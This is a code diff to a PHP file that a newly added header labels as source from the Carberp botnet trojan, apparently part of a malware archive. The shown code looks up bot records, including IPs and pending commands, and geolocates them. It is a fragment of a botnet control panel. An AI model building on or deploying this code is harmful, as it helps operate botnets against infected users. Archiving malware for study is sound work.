@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';
@@ -62,7 +73,9 @@ $bot = $mysqli->query('SELECT id, uid, prefix, country, ip, cmd, cmd_history, no
 
 if(function_exists('geoip_country_code_by_name')){
 	$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
-}else{	if(file_exists($dir . 'cache/geoip/')){		require_once($dir . 'cache/geoip/geoip.inc');
+}else{
+	if(file_exists($dir . 'cache/geoip/')){
+		require_once($dir . 'cache/geoip/geoip.inc');
 		$gi = geoip_open($dir . 'cache/geoip/GeoIP.dat',GEOIP_STANDARD);
 		$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
 		geoip_close($gi);
